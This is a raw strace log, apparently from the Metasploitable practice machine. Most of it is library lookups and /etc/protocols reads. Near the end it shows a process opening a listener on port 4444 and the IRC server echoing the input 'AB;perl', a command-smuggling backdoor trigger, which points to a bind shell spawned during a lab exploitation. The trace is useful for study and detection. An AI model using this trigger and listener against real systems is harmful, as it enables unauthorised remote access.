19002 12:57:07.457927 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.457946 stat64("/lib/tls/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.457961 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.457975 stat64("/lib/tls/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.457986 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.457999 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458018 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458030 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458047 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458060 stat64("/lib/tls/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458071 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458083 stat64("/lib/tls/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458094 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458131 stat64("/lib/tls/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458143 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458154 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458171 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458184 stat64("/lib/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458195 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458207 stat64("/lib/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458218 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458230 stat64("/lib/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458241 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458253 stat64("/lib/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458264 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458276 stat64("/lib/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458287 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458299 stat64("/lib/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458309 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458321 stat64("/lib/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458332 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458343 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458360 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458373 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458385 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458398 stat64("/usr/lib/tls/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458409 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458422 stat64("/usr/lib/tls/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458433 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458450 stat64("/usr/lib/tls/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458461 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458474 stat64("/usr/lib/tls/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458485 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458498 stat64("/usr/lib/tls/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458509 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458521 stat64("/usr/lib/tls/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458533 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458544 stat64("/usr/lib/tls", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458555 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458569 stat64("/usr/lib/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458625 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458642 stat64("/usr/lib/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458654 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458682 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458700 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458712 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.458730 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458742 stat64("/usr/lib/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458753 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458766 stat64("/usr/lib/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458777 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458789 stat64("/usr/lib/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458800 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458812 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
19002 12:57:07.458829 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458843 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458856 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458869 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458882 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458895 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458908 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458920 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458932 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458946 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458958 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458971 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.458986 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.458999 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459011 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459024 stat64("/lib/i486-linux-gnu/tls", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459035 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459049 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459061 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459075 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459087 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459127 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459154 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459167 stat64("/lib/i486-linux-gnu/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459179 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459192 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459204 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459217 stat64("/lib/i486-linux-gnu/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459228 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459241 stat64("/lib/i486-linux-gnu/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459253 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459266 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.459283 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459298 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459311 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459325 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459337 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459351 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459364 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459377 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459389 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459403 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459416 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459429 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459441 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459455 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459470 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459483 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459495 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459509 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459522 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459535 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459548 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459561 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459573 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459586 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459623 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459652 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459665 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459678 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459690 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459703 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf8e3d7c) = -1 ENOENT (No such file or directory)
19002 12:57:07.459715 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
19002 12:57:07.459728 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
19002 12:57:07.459747 munmap(0xb7ce8000, 29913) = 0
19002 12:57:07.459768 open("/etc/ld.so.cache", O_RDONLY) = 7
19002 12:57:07.459781 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
19002 12:57:07.459798 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7ce8000
19002 12:57:07.459808 close(7)          = 0
19002 12:57:07.459819 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19002 12:57:07.459834 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 7
19002 12:57:07.459849 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
19002 12:57:07.459942 fstat64(7, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
19002 12:57:07.459963 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7cdd000
19002 12:57:07.459976 mmap2(0xb7ce6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x8) = 0xb7ce6000
19002 12:57:07.459996 close(7)          = 0
19002 12:57:07.460021 munmap(0xb7ce8000, 29913) = 0
19002 12:57:07.460037 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 7
19002 12:57:07.460053 fcntl64(7, F_GETFD) = 0x1 (flags FD_CLOEXEC)
19002 12:57:07.460069 fstat64(7, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
19002 12:57:07.460086 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cef000
19002 12:57:07.460139 read(7, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
19002 12:57:07.460328 close(7)          = 0
19002 12:57:07.460339 munmap(0xb7cef000, 4096) = 0
19002 12:57:07.460357 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 7
19002 12:57:07.460371 fstat64(7, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
19002 12:57:07.460388 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cef000
19002 12:57:07.460398 read(7, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
19002 12:57:07.460579 close(7)          = 0
19002 12:57:07.460589 munmap(0xb7cef000, 4096) = 0
19002 12:57:07.460660 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 7
19002 12:57:07.460682 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4288) = -1 EINVAL (Invalid argument)
19002 12:57:07.460696 _llseek(7, 0, 0xbf8e42d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.460708 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4288) = -1 EINVAL (Invalid argument)
19002 12:57:07.460719 _llseek(7, 0, 0xbf8e42d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.460729 fcntl64(7, F_SETFD, FD_CLOEXEC) = 0
19002 12:57:07.460785 setsockopt(7, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
19002 12:57:07.460821 bind(7, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
19002 12:57:07.460846 listen(7, 5)      = 0
19002 12:57:07.460900 accept(7,  <unfinished ...>
19001 12:57:07.461175 exit_group(0)     = ?
18999 12:57:07.461255 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 19001
18999 12:57:07.461270 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.461282 --- SIGCHLD (Child exited) @ 0 (0) ---
18999 12:57:07.461289 waitpid(-1, 0xbfb86ef8, WNOHANG) = -1 ECHILD (No child processes)
18999 12:57:07.461300 sigreturn()       = ? (mask now [])
18999 12:57:07.461316 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
18999 12:57:07.461360 exit_group(0)     = ?
4519  12:57:07.461395 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 18999
4519  12:57:07.461408 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  12:57:07.461422 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  12:57:07.461433 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  12:57:07.461447 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  12:57:07.461465 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  12:57:07.461530 time(NULL)        = 1495645027
4519  12:57:07.461544 time(NULL)        = 1495645027
